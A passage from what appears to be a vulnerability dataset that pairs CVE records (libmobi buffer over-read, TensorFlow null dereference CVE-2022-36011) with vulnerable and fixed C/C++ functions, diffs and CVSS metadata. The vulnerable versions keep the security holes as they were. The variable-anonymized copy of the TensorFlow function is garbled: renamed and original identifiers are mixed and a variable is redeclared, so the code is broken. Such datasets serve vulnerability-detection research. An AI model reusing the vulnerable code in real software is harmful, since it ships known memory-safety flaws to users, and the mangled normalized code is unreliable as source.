                }
            }
            if (tagvalues_count) {
                const size_t arr_size = tagvalues_count * sizeof(*indx->entries[entry_number].tags[i].tagvalues);
                indx->entries[entry_number].tags[i].tagvalues = malloc(arr_size);
                if (indx->entries[entry_number].tags[i].tagvalues == NULL) {
                    debug_print(""Memory allocation failed (%zu bytes)\n"", arr_size);
                    free(ptagx);
                    return MOBI_MALLOC_FAILED;
                }
                memcpy(indx->entries[entry_number].tags[i].tagvalues, tagvalues, arr_size);
            } else {
                indx->entries[entry_number].tags[i].tagvalues = NULL;
            }
            indx->entries[entry_number].tags[i].tagid = ptagx[i].tag;
            indx->entries[entry_number].tags[i].tagvalues_count = tagvalues_count;
            indx->entries[entry_number].tags_count++;
            i++;
        }
        free(ptagx);
    }
    /* restore buffer maxlen */
    buf->maxlen = buf_maxlen;
    return MOBI_SUCCESS;
}","static MOBI_RET mobi_parse_index_entry(MOBIIndx *VAR_0, const MOBIIdxt VAR_1, const MOBITagx *VAR_2, const MOBIOrdt *VAR_3, MOBIBuffer *VAR_4, const size_t VAR_5) {
    if (VAR_0 == NULL) {
        debug_print(""%s"", ""INDX structure not initialized\n"");
        return VAR_6;
    }
    const size_t VAR_7 = VAR_0->entries_count;
    const size_t VAR_8 = VAR_1.offsets[VAR_5 + 1] - VAR_1.offsets[VAR_5];
    mobi_buffer_setpos(VAR_4, VAR_1.offsets[VAR_5]);
    size_t VAR_9 = VAR_5 + VAR_7;
    if (VAR_9 >= VAR_0->total_entries_count) {
        debug_print(""Entry number beyond array: %zu\n"", VAR_9);
        return VAR_10;
    }
    /* COMMENT_0 */
    const size_t VAR_11 = VAR_4->maxlen;
    if (VAR_4->offset + VAR_8 >= VAR_11) {
        debug_print(""Entry length too long: %zu\n"", VAR_8);
        return VAR_10;
    }
    VAR_4->maxlen = VAR_4->offset + VAR_8;
    size_t VAR_12 = mobi_buffer_get8(VAR_4);
    if (VAR_12 > VAR_8) {
        debug_print(""Label length too long: %zu\n"", VAR_12);
        return VAR_10;
    }
    char VAR_13[VAR_14 + 1];
    /* COMMENT_1 */
    if (VAR_3->ordt2) {
        VAR_12 = mobi_getstring_ordt(VAR_3, VAR_4, (unsigned char*) VAR_13, VAR_12);
    } else {
        VAR_12 = mobi_indx_get_label((unsigned char*) VAR_13, VAR_4, VAR_12, VAR_0->ligt_entries_count);
        if (VAR_4->error != VAR_15) {
            debug_print(""Buffer error reading label: %d\n"", VAR_4->error);
            return VAR_10;
        }
    }
    VAR_0->entries[VAR_9].label = malloc(VAR_12 + 1);
    if (VAR_0->entries[VAR_9].label == NULL) {
        debug_print(""Memory allocation failed (%zu bytes)\n"", VAR_12);
        return VAR_16;
    }
    strncpy(VAR_0->entries[VAR_9].label, VAR_13, VAR_12 + 1);
    /* COMMENT_2 */
    unsigned char *VAR_17;
    VAR_17 = VAR_4->data + VAR_4->offset;
    mobi_buffer_seek(VAR_4, (int) VAR_2->control_byte_count);
    VAR_0->entries[VAR_9].tags_count = 0;
    VAR_0->entries[VAR_9].tags = NULL;
    if (VAR_2->tags_count > 0) {
        typedef struct {
            uint8_t tag;
            uint8_t tag_value_count;
            uint32_t value_count;
            uint32_t value_bytes;
        } MOBIPtagx;
        MOBIPtagx *VAR_18 = malloc(VAR_2->tags_count * sizeof(MOBIPtagx));
        if (VAR_18 == NULL) {
            debug_print(""Memory allocation failed (%zu bytes)\n"", VAR_2->tags_count * sizeof(MOBIPtagx));
            return VAR_16;
        }
        uint32_t VAR_19 = 0;
        size_t VAR_20;
        size_t VAR_21 = 0;
        while (VAR_21 < VAR_2->tags_count) {
            if (VAR_2->tags[VAR_21].control_byte == 1) {
                VAR_17++;
                VAR_21++;
                continue;
            }
            uint32_t VAR_22 = VAR_17[0] & VAR_2->tags[VAR_21].bitmask;
            if (VAR_22 != 0) {
                /* COMMENT_3 */
                uint32_t VAR_23 = VAR_24;
                uint32_t VAR_25 = VAR_24;
                /* COMMENT_4 */
                if (VAR_22 == VAR_2->tags[VAR_21].bitmask) {
                    /* COMMENT_5 */
                    if (mobi_bitcount(VAR_2->tags[VAR_21].bitmask) > 1) {
                        /* COMMENT_6 */
                        VAR_20 = 0;
                        VAR_25 = mobi_buffer_get_varlen(VAR_4, &VAR_20);
                    } else {
                        VAR_23 = 1;
                    }
                } else {
                    uint8_t VAR_26 = VAR_2->tags[VAR_21].bitmask;
                    while ((VAR_26 & 1) == 0) {
                        VAR_26 >>= 1;
                        VAR_22 >>= 1;
                    }
                    VAR_23 = VAR_22;
                }
                VAR_18[VAR_19].tag = VAR_2->tags[VAR_21].tag;
                VAR_18[VAR_19].tag_value_count = VAR_2->tags[VAR_21].values_count;
                VAR_18[VAR_19].value_count = VAR_23;
                VAR_18[VAR_19].value_bytes = VAR_25;
                VAR_19++;
            }
            VAR_21++;
        }
        VAR_0->entries[VAR_9].tags = malloc(VAR_2->tags_count * sizeof(VAR_27));
        if (VAR_0->entries[VAR_9].tags == NULL) {
            debug_print(""Memory allocation failed (%zu bytes)\n"", VAR_2->tags_count * sizeof(VAR_27));
            free(VAR_18);
            return VAR_16;
        }
        VAR_21 = 0;
        while (VAR_21 < VAR_19) {
            uint32_t VAR_28 = 0;
            /* COMMENT_3 */
            /* COMMENT_7 */
            uint32_t VAR_29[VAR_30];
            if (VAR_18[VAR_21].value_count != VAR_24) {
                size_t VAR_31 = VAR_18[VAR_21].value_count * VAR_18[VAR_21].tag_value_count;
                while (VAR_31-- && VAR_28 < VAR_30) {
                    VAR_20 = 0;
                    const uint32_t VAR_25 = mobi_buffer_get_varlen(VAR_4, &VAR_20);
                    VAR_29[VAR_28++] = VAR_25;
                }
            /* COMMENT_8 */
            } else {
                /* COMMENT_9 */
                VAR_20 = 0;
                while (VAR_20 < VAR_18[VAR_21].value_bytes && VAR_28 < VAR_30) {
                    const uint32_t VAR_25 = mobi_buffer_get_varlen(VAR_4, &VAR_20);
                    VAR_29[VAR_28++] = VAR_25;
                }
            }
            if (VAR_28) {
                const size_t VAR_32 = VAR_28 * sizeof(*VAR_0->entries[VAR_9].tags[VAR_21].tagvalues);
                VAR_0->entries[VAR_9].tags[VAR_21].tagvalues = malloc(VAR_32);
                if (VAR_0->entries[VAR_9].tags[VAR_21].tagvalues == NULL) {
                    debug_print(""Memory allocation failed (%zu bytes)\n"", VAR_32);
                    free(VAR_18);
                    return VAR_16;
                }
                memcpy(VAR_0->entries[VAR_9].tags[VAR_21].tagvalues, VAR_29, VAR_32);
            } else {
                VAR_0->entries[VAR_9].tags[VAR_21].tagvalues = NULL;
            }
            VAR_0->entries[VAR_9].tags[VAR_21].tagid = VAR_18[VAR_21].tag;
            VAR_0->entries[VAR_9].tags[VAR_21].tagvalues_count = VAR_28;
            VAR_0->entries[VAR_9].tags_count++;
            VAR_21++;
        }
        free(VAR_18);
    }
    /* COMMENT_10 */
    VAR_4->maxlen = VAR_11;
    return VAR_15;
}",bfabiszewski/libmobi/612562bc1ea38f1708b044e7a079c47a05b1291d/index.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -23,12 +23,16 @@
         debug_print(""Label length too long: %zu\n"", label_length);
         return MOBI_DATA_CORRUPT;
     }
-    char text[INDX_LABEL_SIZEMAX];
+    char text[INDX_LABEL_SIZEMAX + 1];
     /* FIXME: what is ORDT1 for? */
     if (ordt->ordt2) {
         label_length = mobi_getstring_ordt(ordt, buf, (unsigned char*) text, label_length);
     } else {
         label_length = mobi_indx_get_label((unsigned char*) text, buf, label_length, indx->ligt_entries_count);
+        if (buf->error != MOBI_SUCCESS) {
+            debug_print(""Buffer error reading label: %d\n"", buf->error);
+            return MOBI_DATA_CORRUPT;
+        }
     }
     indx->entries[entry_number].label = malloc(label_length + 1);
     if (indx->entries[entry_number].label == NULL) {","{'deleted_lines': ['    char text[INDX_LABEL_SIZEMAX];'], 'added_lines': ['    char text[INDX_LABEL_SIZEMAX + 1];', '        if (buf->error != MOBI_SUCCESS) {', '            debug_print(""Buffer error reading label: %d\\n"", buf->error);', '            return MOBI_DATA_CORRUPT;', '        }']}",True,Buffer Over-read in GitHub repository bfabiszewski/libmobi prior to 0.11.,8.1,HIGH,2,valid,2022-05-05T18:54:11Z,4
CVE-2022-36011,['CWE-476'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,tensorflow,"[tfg][functiondef_import] Emit error on empty function attributes

Disallow empty function attributes. Emit an error when one is encountered.

PiperOrigin-RevId: 448629968",1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b,https://github.com/tensorflow/tensorflow/commit/1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b,tensorflow/core/ir/importexport/functiondef_import.cc,ImportGenericFunction,"Status ImportGenericFunction(
GraphFuncOp func_op, const FunctionDef& func,
llvm::StringMap<llvm::StringMap<SmallVector<Value, 1>>>& values_map,
OpBuilder& builder) {
const OpDef& signature = func.signature();
Location unknown_loc = builder.getUnknownLoc();
MLIRContext* context = builder.getContext();
TFGraphDialect* tfgDialect = cast<TFGraphDialect>(func_op->getDialect());
NamedAttrList attrs;
DictionaryAttr func_attrs = builder.getDictionaryAttr({});
if (signature.name().empty())
return InvalidArgument(""generic function without a name"");
attrs.append(""sym_name"", builder.getStringAttr(signature.name()));
attrs.append(""generic"", builder.getUnitAttr());
if (!signature.description().empty())
attrs.append(""description"", builder.getStringAttr(signature.description()));
if (signature.is_stateful())
attrs.append(""is_stateful"", builder.getUnitAttr());
if (signature.control_output_size()) {
llvm::SmallVector<Attribute> control_outputs;
for (const std::string& output : signature.control_output())
control_outputs.push_back(builder.getStringAttr(output));
attrs.append(""control_output"", builder.getArrayAttr(control_outputs));
}
{
NamedAttrList attr_defs;
for (const OpDef_AttrDef& attr : signature.attr()) {
NamedAttrList attr_def;
if (attr.name().empty())
return InvalidArgument(""Missing name for function attribute"");
if (!attr.type().empty())
attr_def.append(builder.getNamedAttr(
""function_type"", builder.getStringAttr(attr.type())));
if (attr.has_default_value()) {
TF_ASSIGN_OR_RETURN(
Attribute attr,
ConvertAttributeValue(attr.default_value(), builder, tfgDialect));
attr_def.append(builder.getNamedAttr(""default_value"", attr));
}
if (!attr.description().empty())
attr_def.append(builder.getNamedAttr(
""description"", builder.getStringAttr(attr.description())));
if (attr.has_minimum() || attr.minimum())
attr_def.append(builder.getNamedAttr(
""minimum"", builder.getI32IntegerAttr(attr.minimum())));
if (attr.has_allowed_values()) {
TF_ASSIGN_OR_RETURN(
Attribute attr,
ConvertAttributeValue(attr.allowed_values(), builder, tfgDialect));
attr_def.append(builder.getNamedAttr(""allowed_values"", attr));
}
attr_defs.append(builder.getNamedAttr(
attr.name(), attr_def.getDictionary(builder.getContext())));
}
if (!attr_defs.empty()) {
func_attrs = attr_defs.getDictionary(builder.getContext());
attrs.append(""tfg.func_attrs"", func_attrs);
}
}
if (func.resource_arg_unique_id_size()) {
SmallVector<int32_t> resource_arg_unique_ids_keys;
SmallVector<int32_t> resource_arg_unique_ids_values;
for (const auto& unique_id : func.resource_arg_unique_id()) {
resource_arg_unique_ids_keys.push_back(unique_id.first);
resource_arg_unique_ids_values.push_back(unique_id.second);
}
attrs.append(""resource_arg_unique_ids_keys"",
builder.getI32TensorAttr(resource_arg_unique_ids_keys));
attrs.append(""resource_arg_unique_ids_values"",
builder.getI32TensorAttr(resource_arg_unique_ids_values));
}
for (const auto& namedAttr : func.attr()) {
const std::string& name = ""tf."" + namedAttr.first;
const AttrValue& tf_attr = namedAttr.second;
TF_ASSIGN_OR_RETURN(Attribute attr,
ConvertAttributeValue(tf_attr, builder, tfgDialect));
attrs.append(name, attr);
}
SmallString<8> arg_or_res_attr_name;
SmallString<8> sub_arg_attr_name;
int arg_num = 0;
llvm::SmallVector<StringRef> arg_names;
llvm::SmallVector<Type> arg_types;
llvm::SmallVector<Attribute> args_attrs;
llvm::SmallVector<Attribute> res_attrs;
for (const auto& enumerated_input : llvm::enumerate(signature.input_arg())) {
const OpDef::ArgDef& input = enumerated_input.value();
TF_ASSIGN_OR_RETURN(NamedAttrList input_attrs,
ConvertArgDefAttributes(input, tfgDialect, builder));
auto it = func.arg_attr().find(enumerated_input.index());
if (it != func.arg_attr().end()) {
NamedAttrList arg_attr;
for (const auto& named_attr : it->second.attr()) {
TF_ASSIGN_OR_RETURN(
Attribute attr,
ConvertAttributeValue(named_attr.second, builder, tfgDialect));
arg_attr.append(named_attr.first, attr);
}
input_attrs.append(""tfg.arg_attrs"",
arg_attr.getDictionary(builder.getContext()));
}
arg_names.push_back(builder.getStringAttr(input.name()).getValue());
arg_types.push_back(OpaqueTensorType::get(context));
args_attrs.push_back(input_attrs.getDictionary(context));
args_attrs.push_back(NamedAttrList{}.getDictionary(context));
arg_num++;
}
attrs.push_back(
builder.getNamedAttr(function_interface_impl::getArgDictAttrName(),
builder.getArrayAttr(args_attrs)));
int res_num = 0;
for (const OpDef::ArgDef& output : signature.output_arg()) {
TF_ASSIGN_OR_RETURN(NamedAttrList output_attrs,
ConvertArgDefAttributes(output, tfgDialect, builder));
res_attrs.push_back(output_attrs.getDictionary(context));
++res_num;
}
for (const std::string& output : signature.control_output()) {
NamedAttrList output_attrs;
output_attrs.append(""tfg.name"", builder.getStringAttr(output));
res_attrs.push_back(output_attrs.getDictionary(context));
++res_num;
}
attrs.push_back(
builder.getNamedAttr(function_interface_impl::getResultDictAttrName(),
builder.getArrayAttr(res_attrs)));
values_map.clear();
Block* body = new Block();
func_op.body().push_back(body);
Type control_ty = ControlType::get(context);
for (auto type_and_name : llvm::zip(arg_types, arg_names)) {
Value arg = body->addArgument(std::get<0>(type_and_name), unknown_loc);
llvm::StringMap<SmallVector<Value, 1>>& values =
values_map[std::get<1>(type_and_name)];
Value ctl = body->addArgument(control_ty, unknown_loc);
values[""""].push_back(arg);
values[""^""].push_back(ctl);
}
OpBuilder body_builder = OpBuilder::atBlockEnd(body);
OperationName mlir_placeholder(""tfg.__mlir_placeholder"", context);
Type placeholder_ty = OpaqueTensorType::get(context);
ValueMapManager value_manager(values_map, body_builder, mlir_placeholder,
placeholder_ty, control_ty, unknown_loc);
TF_RETURN_WITH_CONTEXT_IF_ERROR(
ImportNodes(value_manager, func.node_def(), body_builder),
"" when importing function "", func.signature().name());
res_num = 0;
llvm::StringMap<int> output_name_to_position;
for (const OpDef::ArgDef& output : signature.output_arg()) {
if (output_name_to_position.count(output.name()))
return InvalidArgument(""Duplicated output_arg entry"", output.name());
output_name_to_position[output.name()] = res_num;
++res_num;
}
res_num = 0;
llvm::StringMap<int> control_output_to_position;
for (const std::string& output : signature.control_output()) {
if (control_output_to_position.count(output))
return InvalidArgument(""Duplicated control_output entry"", output);
control_output_to_position[output] = res_num;
++res_num;
}
SmallVector<Value> ret_vals(func.ret_size() + func.control_ret_size(),
Value());
for (const auto& ret_val : func.ret()) {
auto position = output_name_to_position.find(ret_val.first);
if (position == output_name_to_position.end())
return InvalidArgument(
""Can't import function, returned value references unknown output ""
""argument "",
ret_val.first);
ret_vals[position->second] =
value_manager.GetValueOrCreatePlaceholder(ret_val.second);
}
for (const auto& ret_val : func.control_ret()) {
auto position = control_output_to_position.find(ret_val.first);
if (position == control_output_to_position.end())
return InvalidArgument(
""Can't import function, returned value references unknown output ""
""argument "",
ret_val.first);
Value result = value_manager.GetValueOrCreatePlaceholder(
(Twine(""^"") + ret_val.second).str());
if (!result.getType().isa<ControlType>())
return InvalidArgument(""failed to map returned value "", ret_val.second,
"", isn't a control output"");
ret_vals[func.ret_size() + position->second] = result;
}
for (auto& indexed_val : llvm::enumerate(ret_vals)) {
if (indexed_val.value()) continue;
return InvalidArgument(
""Failed to import function, missing output for position "",
indexed_val.index());
}
MutableArrayRef<Value> operands = ret_vals;
ReturnOp ret_op = body_builder.create<ReturnOp>(
unknown_loc, operands.slice(0, func.ret_size()),
operands.slice(func.ret_size()));
{
SmallVector<Type> arg_types_with_ctl;
for (Type type : arg_types) {
arg_types_with_ctl.push_back(type);
arg_types_with_ctl.push_back(control_ty);
}
attrs.append(""function_type"",
TypeAttr::get(builder.getFunctionType(
arg_types_with_ctl, ret_op.getOperandTypes())));
}
func_op->setAttrs(attrs);
return Status::OK();
}","Status ImportGenericFunction(
GraphFuncOp VAR_0, const FunctionDef& VAR_1,
llvm::StringMap<llvm::StringMap<SmallVector<Value, 1>>>& VAR_2,
OpBuilder& VAR_3) {
const OpDef& VAR_4 = VAR_1.signature();
Location VAR_5 = VAR_3.getUnknownLoc();
MLIRContext* VAR_6 = VAR_3.getContext();
TFGraphDialect* VAR_7 = VAR_8<TFGraphDialect>(VAR_0->getDialect());
NamedAttrList VAR_9;
DictionaryAttr VAR_10 = VAR_3.getDictionaryAttr({});
if (VAR_4.name().empty())
return InvalidArgument(""generic function without a name"");
VAR_9.append(""sym_name"", VAR_3.getStringAttr(VAR_4.name()));
VAR_9.append(""generic"", VAR_3.getUnitAttr());
if (!VAR_4.description().empty())
VAR_9.append(""description"", VAR_3.getStringAttr(VAR_4.description()));
if (VAR_4.is_stateful())
VAR_9.append(""is_stateful"", VAR_3.getUnitAttr());
if (VAR_4.control_output_size()) {
llvm::SmallVector<Attribute> VAR_11;
for (const std::string& VAR_12 : VAR_4.control_output())
VAR_11.push_back(VAR_3.getStringAttr(VAR_12));
VAR_9.append(""control_output"", VAR_3.getArrayAttr(VAR_11));
}
{
NamedAttrList VAR_13;
for (const OpDef_AttrDef& VAR_14 : VAR_4.attr()) {
NamedAttrList VAR_15;
if (VAR_14.name().empty())
return InvalidArgument(""Missing name for function attribute"");
if (!VAR_14.type().empty())
VAR_15.append(VAR_3.getNamedAttr(
""function_type"", VAR_3.getStringAttr(VAR_14.type())));
if (VAR_14.has_default_value()) {
TF_ASSIGN_OR_RETURN(
Attribute VAR_14,
ConvertAttributeValue(attr.default_value(), builder, tfgDialect));
VAR_15.append(builder.getNamedAttr(""default_value"", attr));
}
if (!attr.description().empty())
VAR_15.append(builder.getNamedAttr(
""description"", builder.getStringAttr(attr.description())));
if (attr.has_minimum() || attr.minimum())
VAR_15.append(builder.getNamedAttr(
""minimum"", builder.getI32IntegerAttr(attr.minimum())));
if (attr.has_allowed_values()) {
TF_ASSIGN_OR_RETURN(
Attribute attr,
ConvertAttributeValue(attr.allowed_values(), builder, tfgDialect));
VAR_15.append(builder.getNamedAttr(""allowed_values"", attr));
}
VAR_13.append(builder.getNamedAttr(
attr.name(), VAR_15.getDictionary(builder.getContext())));
}
if (!VAR_13.empty()) {
VAR_10 = VAR_13.getDictionary(builder.getContext());
VAR_9.append(""tfg.func_attrs"", VAR_10);
}
}
if (VAR_1.resource_arg_unique_id_size()) {
SmallVector<int32_t> VAR_16;
SmallVector<int32_t> VAR_17;
for (const auto& VAR_18 : VAR_1.resource_arg_unique_id()) {
VAR_16.push_back(VAR_18.first);
VAR_17.push_back(VAR_18.second);
}
VAR_9.append(""resource_arg_unique_ids_keys"",
builder.getI32TensorAttr(VAR_16));
VAR_9.append(""resource_arg_unique_ids_values"",
builder.getI32TensorAttr(VAR_17));
}
for (const auto& VAR_19 : VAR_1.attr()) {
const std::string& VAR_20 = ""tf."" + VAR_19.first;
const AttrValue& VAR_21 = VAR_19.second;
TF_ASSIGN_OR_RETURN(Attribute attr,
ConvertAttributeValue(tf_attr, builder, tfgDialect));
VAR_9.append(VAR_20, attr);
}
SmallString<8> VAR_22;
SmallString<8> VAR_23;
int VAR_24 = 0;
llvm::SmallVector<StringRef> VAR_25;
llvm::SmallVector<Type> VAR_26;
llvm::SmallVector<Attribute> VAR_27;
llvm::SmallVector<Attribute> VAR_28;
for (const auto& VAR_29 : llvm::enumerate(VAR_4.input_arg())) {
const OpDef::ArgDef& VAR_30 = VAR_29.value();
TF_ASSIGN_OR_RETURN(NamedAttrList VAR_31,
ConvertArgDefAttributes(input, tfgDialect, builder));
auto VAR_32 = VAR_1.arg_attr().find(VAR_29.index());
if (VAR_32 != VAR_1.arg_attr().end()) {
NamedAttrList VAR_33;
for (const auto& VAR_34 : VAR_32->second.attr()) {
TF_ASSIGN_OR_RETURN(
Attribute attr,
ConvertAttributeValue(named_attr.VAR_35, builder, tfgDialect));
VAR_33.append(named_attr.first, attr);
}
VAR_31.append(""tfg.arg_attrs"",
VAR_33.getDictionary(builder.getContext()));
}
VAR_25.push_back(builder.getStringAttr(input.name()).getValue());
VAR_26.push_back(OpaqueTensorType::get(VAR_6));
VAR_27.push_back(VAR_31.getDictionary(VAR_6));
VAR_27.push_back(NamedAttrList{}.getDictionary(VAR_6));
VAR_24++;
}
VAR_9.push_back(
builder.getNamedAttr(function_interface_impl::getArgDictAttrName(),
builder.getArrayAttr(VAR_27)));
int VAR_36 = 0;
for (const OpDef::ArgDef& VAR_12 : VAR_4.output_arg()) {
TF_ASSIGN_OR_RETURN(NamedAttrList VAR_37,
ConvertArgDefAttributes(output, tfgDialect, builder));
VAR_28.push_back(VAR_37.getDictionary(VAR_6));
++VAR_36;
}
for (const std::string& output : VAR_4.control_output()) {
NamedAttrList VAR_37;
VAR_37.append(""tfg.name"", builder.getStringAttr(output));
VAR_28.push_back(VAR_37.getDictionary(VAR_6));
++VAR_36;
}
VAR_9.push_back(
builder.getNamedAttr(function_interface_impl::getResultDictAttrName(),
builder.getArrayAttr(VAR_28)));
VAR_2.clear();
Block* VAR_38 = new Block();
VAR_0.body().push_back(VAR_38);
Type VAR_39 = ControlType::get(VAR_6);
for (auto VAR_40 : llvm::zip(VAR_26, VAR_25)) {
Value VAR_41 = VAR_38->addArgument(std::VAR_42<0>(VAR_40), VAR_5);
llvm::StringMap<SmallVector<Value, 1>>& VAR_43 =
VAR_2[std::VAR_42<1>(VAR_40)];
Value VAR_44 = VAR_38->addArgument(VAR_39, VAR_5);
VAR_43[""""].push_back(VAR_41);
VAR_43[""^""].push_back(VAR_44);
}
OpBuilder VAR_45 = OpBuilder::atBlockEnd(VAR_38);
OperationName VAR_46(""tfg.__mlir_placeholder"", VAR_6);
Type VAR_47 = OpaqueTensorType::get(VAR_6);
ValueMapManager value_manager(values_map, body_builder, mlir_placeholder,
placeholder_ty, control_ty, unknown_loc);
TF_RETURN_WITH_CONTEXT_IF_ERROR(
ImportNodes(VAR_48, VAR_1.node_def(), body_builder),
"" when importing function "", VAR_1.signature().name());
VAR_36 = 0;
llvm::StringMap<int> VAR_49;
for (const OpDef::ArgDef& output : VAR_4.output_arg()) {
if (VAR_49.count(output.name()))
return InvalidArgument(""Duplicated output_arg entry"", output.name());
VAR_49[output.name()] = VAR_36;
++VAR_36;
}
VAR_36 = 0;
llvm::StringMap<int> VAR_50;
for (const std::string& output : VAR_4.control_output()) {
if (VAR_50.count(output))
return InvalidArgument(""Duplicated control_output entry"", output);
VAR_50[output] = VAR_36;
++VAR_36;
}
SmallVector<Value> VAR_51(VAR_1.ret_size() + VAR_1.control_ret_size(),
Value());
for (const auto& VAR_52 : VAR_1.ret()) {
auto VAR_53 = VAR_49.find(VAR_52.first);
if (VAR_53 == VAR_49.end())
return InvalidArgument(
""Can't import function, returned value references unknown output ""
""argument "",
VAR_52.first);
VAR_51[VAR_53->second] =
VAR_48.GetValueOrCreatePlaceholder(VAR_52.second);
}
for (const auto& VAR_52 : VAR_1.control_ret()) {
auto VAR_53 = VAR_50.find(VAR_52.first);
if (VAR_53 == VAR_50.end())
return InvalidArgument(
""Can't import function, returned value references unknown output ""
""argument "",
VAR_52.first);
Value VAR_54 = VAR_48.GetValueOrCreatePlaceholder(
(Twine(""^"") + VAR_52.second).str());
if (!VAR_54.getType().isa<ControlType>())
return InvalidArgument(""failed to map returned value "", VAR_52.second,
"", isn't a control output"");
VAR_51[VAR_1.ret_size() + VAR_53->second] = VAR_54;
}
for (auto& VAR_55 : llvm::enumerate(VAR_51)) {
if (VAR_55.value()) continue;
return InvalidArgument(
""Failed to import function, missing output for position "",
VAR_55.index());
}
MutableArrayRef<Value> VAR_56 = VAR_51;
ReturnOp VAR_57 = body_builder.create<ReturnOp>(
unknown_loc, VAR_56.slice(0, VAR_1.ret_size()),
VAR_56.slice(VAR_1.ret_size()));
{
SmallVector<Type> VAR_58;
for (Type VAR_59 : VAR_26) {
VAR_58.push_back(VAR_59);
VAR_58.push_back(control_ty);
}
VAR_9.append(""function_type"",
TypeAttr::get(builder.getFunctionType(
VAR_58, VAR_57.getOperandTypes())));
}
VAR_0->setAttrs(VAR_9);
return Status::OK();
}",tensorflow/1cf45b831eeb0cab8655c9c7c5d06ec6f45fc41b/functiondef_import.cc/vul/before/0.json,"Status ImportGenericFunction(
    GraphFuncOp func_op, const FunctionDef& func,
    llvm::StringMap<llvm::StringMap<SmallVector<Value, 1>>>& values_map,
    OpBuilder& builder) {
  const OpDef& signature = func.signature();
  Location unknown_loc = builder.getUnknownLoc();
  MLIRContext* context = builder.getContext();

  TFGraphDialect* tfgDialect = cast<TFGraphDialect>(func_op->getDialect());
  NamedAttrList attrs;
  DictionaryAttr func_attrs = builder.getDictionaryAttr({});
  if (signature.name().empty())
    return InvalidArgument(""generic function without a name"");
  attrs.append(""sym_name"", builder.getStringAttr(signature.name()));
  attrs.append(""generic"", builder.getUnitAttr());
  if (!signature.description().empty())
    attrs.append(""description"", builder.getStringAttr(signature.description()));
  if (signature.is_stateful())
    attrs.append(""is_stateful"", builder.getUnitAttr());
  if (signature.control_output_size()) {
    llvm::SmallVector<Attribute> control_outputs;
    for (const std::string& output : signature.control_output())
      control_outputs.push_back(builder.getStringAttr(output));
    attrs.append(""control_output"", builder.getArrayAttr(control_outputs));
  }
  {
    NamedAttrList attr_defs;
    for (const OpDef_AttrDef& attr : signature.attr()) {
      NamedAttrList attr_def;
      if (attr.name().empty())
        return InvalidArgument(""Missing name for function attribute"");
      if (!attr.type().empty())
        attr_def.append(builder.getNamedAttr(
            ""function_type"", builder.getStringAttr(attr.type())));
      if (attr.has_default_value()) {
        TF_ASSIGN_OR_RETURN(
            Attribute attr,
            ConvertAttributeValue(attr.default_value(), builder, tfgDialect));
        attr_def.append(builder.getNamedAttr(""default_value"", attr));
      }
      if (!attr.description().empty())
        attr_def.append(builder.getNamedAttr(
            ""description"", builder.getStringAttr(attr.description())));
      if (attr.has_minimum() || attr.minimum())
        attr_def.append(builder.getNamedAttr(
            ""minimum"", builder.getI32IntegerAttr(attr.minimum())));
      if (attr.has_allowed_values()) {
        TF_ASSIGN_OR_RETURN(
            Attribute attr,
            ConvertAttributeValue(attr.allowed_values(), builder, tfgDialect));
        attr_def.append(builder.getNamedAttr(""allowed_values"", attr));
      }
      attr_defs.append(builder.getNamedAttr(
          attr.name(), attr_def.getDictionary(builder.getContext())));
    }
    if (!attr_defs.empty()) {
      func_attrs = attr_defs.getDictionary(builder.getContext());
      attrs.append(""tfg.func_attrs"", func_attrs);
    }
  }

  // The resource_arg_unique_id is a list of `pair<int, int>`, we import it
  // as two arrays of integer right now.
  if (func.resource_arg_unique_id_size()) {
    SmallVector<int32_t> resource_arg_unique_ids_keys;
    SmallVector<int32_t> resource_arg_unique_ids_values;
    for (const auto& unique_id : func.resource_arg_unique_id()) {
      resource_arg_unique_ids_keys.push_back(unique_id.first);
      resource_arg_unique_ids_values.push_back(unique_id.second);
    }
    attrs.append(""resource_arg_unique_ids_keys"",
                 builder.getI32TensorAttr(resource_arg_unique_ids_keys));
    attrs.append(""resource_arg_unique_ids_values"",
                 builder.getI32TensorAttr(resource_arg_unique_ids_values));
  }

  // Import the function attributes with a `tf.` prefix to match the current
  // infrastructure expectations.
  for (const auto& namedAttr : func.attr()) {
    if (namedAttr.first.empty())
      return InvalidArgument(""Invalid function attribute name"");
    const std::string& name = ""tf."" + namedAttr.first;
    const AttrValue& tf_attr = namedAttr.second;
    TF_ASSIGN_OR_RETURN(Attribute attr,
                        ConvertAttributeValue(tf_attr, builder, tfgDialect));
    attrs.append(name, attr);
  }
  SmallString<8> arg_or_res_attr_name;
  SmallString<8> sub_arg_attr_name;
  // Iterate of the input in the signature. Each input will correspond to
  // potentially multiple arguments because of how the OpDef allows repeated
  // arguments controlled by `number_attr` for example.
  // We populate the `arg_names` vector with the name of each input at each
  // position, and `arg_types` with the matching type.
  int arg_num = 0;
  llvm::SmallVector<StringRef> arg_names;
  llvm::SmallVector<Type> arg_types;
  llvm::SmallVector<Attribute> args_attrs;
  llvm::SmallVector<Attribute> res_attrs;
  for (const auto& enumerated_input : llvm::enumerate(signature.input_arg())) {
    const OpDef::ArgDef& input = enumerated_input.value();
    TF_ASSIGN_OR_RETURN(NamedAttrList input_attrs,
                        ConvertArgDefAttributes(input, tfgDialect, builder));
    auto it = func.arg_attr().find(enumerated_input.index());
    if (it != func.arg_attr().end()) {
      NamedAttrList arg_attr;
      for (const auto& named_attr : it->second.attr()) {
        TF_ASSIGN_OR_RETURN(
            Attribute attr,
            ConvertAttributeValue(named_attr.second, builder, tfgDialect));
        arg_attr.append(named_attr.first, attr);
      }
      input_attrs.append(""tfg.arg_attrs"",
                         arg_attr.getDictionary(builder.getContext()));
    }
    arg_names.push_back(builder.getStringAttr(input.name()).getValue());
    arg_types.push_back(OpaqueTensorType::get(context));
    args_attrs.push_back(input_attrs.getDictionary(context));
    args_attrs.push_back(NamedAttrList{}.getDictionary(context));
    arg_num++;
  }
  attrs.push_back(
      builder.getNamedAttr(function_interface_impl::getArgDictAttrName(),
                           builder.getArrayAttr(args_attrs)));

  // Process the results attributes now.
  int res_num = 0;
  for (const OpDef::ArgDef& output : signature.output_arg()) {
    TF_ASSIGN_OR_RETURN(NamedAttrList output_attrs,
                        ConvertArgDefAttributes(output, tfgDialect, builder));
    res_attrs.push_back(output_attrs.getDictionary(context));
    ++res_num;
  }
  // Process the control output metadata and store them as attributes.
  for (const std::string& output : signature.control_output()) {
    NamedAttrList output_attrs;
    output_attrs.append(""tfg.name"", builder.getStringAttr(output));
